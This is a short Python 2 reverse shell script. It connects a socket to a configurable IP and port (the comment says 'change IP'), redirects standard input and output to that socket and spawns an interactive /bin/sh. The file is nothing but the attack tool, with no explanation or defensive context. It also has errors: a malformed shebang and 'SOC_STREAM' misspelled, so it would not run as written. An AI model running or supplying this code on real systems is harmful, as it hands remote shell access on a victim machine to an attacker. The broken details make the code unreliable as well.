#env /bin/python2
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOC_STREAM)
s.connect(('127.0.0.1',1290)) #change IP
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh", "-i"])
